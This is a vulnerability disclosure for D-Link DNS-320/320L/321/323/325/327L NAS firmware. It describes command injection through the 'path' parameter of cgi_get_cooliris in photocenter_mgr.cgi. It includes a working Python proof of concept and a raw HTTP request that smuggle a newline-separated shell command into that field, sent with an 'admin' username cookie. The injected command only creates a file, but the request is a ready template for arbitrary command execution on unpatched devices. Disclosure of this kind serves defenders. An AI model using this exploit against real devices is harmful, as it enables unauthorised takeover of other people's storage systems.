# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L  all firmware version
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_get_cooliris function of the file /cgi-bin/photocenter_mgr.cgi.  The variable `path` is passed from a POST request and is assigned to `v2` via the `sprintf` function at line 49. It is then passed into `v3` and invoked by the `system` command,  the `SpecSymbol2BackSlash` function did not work  which leads to command execution.  
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723391120521-afdfd69b-511b-4c2f-8390-f7d2b26d1056.png#averageHue=%23fbfbfa&clientId=u6631d2ac-2a9c-4&from=paste&height=184&id=uea6fcc03&originHeight=245&originWidth=829&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=41682&status=done&style=none&taskId=u15c3f59e-db46-4a08-a82e-0d06403f548&title=&width=622.5555419921875)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723391105248-02f05131-3814-4ae2-b941-6c9ed09f08f0.png#averageHue=%23fdfdfd&clientId=u6631d2ac-2a9c-4&from=paste&height=287&id=ubf729548&originHeight=506&originWidth=1088&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=55756&status=done&style=none&taskId=u4a8ff842-0edc-4241-811a-55c72d1c80d&title=&width=617.5555419921875)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/photocenter_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_get_cooliris&path=%0atouch%09/tmp/333%0a&username=/tmp/111&rp=10&page=10&r=10&date=19&album_name=/tmp/"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/photocenter_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Referer: http://192.168.0.32/photo_center/index.html
Cookie: username=admin
Priority: u=1

cmd=cgi_get_cooliris&path=%0atouch%09/tmp/333%0a&username=/tmp/111&rp=10&page=10&r=10&date=19&album_name=/tmp/
```


